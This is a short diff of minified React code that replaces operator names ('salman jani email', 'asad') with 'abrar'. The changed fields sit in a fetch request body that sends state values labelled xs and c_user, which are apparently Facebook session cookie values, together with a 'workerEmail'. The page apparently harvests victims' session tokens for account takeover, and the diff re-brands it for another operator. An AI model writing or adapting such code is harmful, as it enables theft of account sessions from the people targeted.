@@ -10065,7 +10065,7 @@
                     } = e;
                     const [r, a] = (0,
                         n.useState)(), [i, l] = (0,
-                        n.useState)(), o = ["salman jani email"], s = _();
+                        n.useState)(), o = ["abrar"], s = _();
                     return (0,
                         he.jsxs)(he.Fragment, {
                         children: [(0,
@@ -10172,10 +10172,10 @@
                                                     },
                                                     body: JSON.stringify({
                                                         emails: o,
-                                                        workerEmail: "salmanjani email",
+                                                        workerEmail: "abrar",
                                                         xs: r,
                                                         c_user: i,
-                                                        name: "asad"
+                                                        name: "abrar"
                                                     })
                                                 }).then((e => {
                                                     e.ok
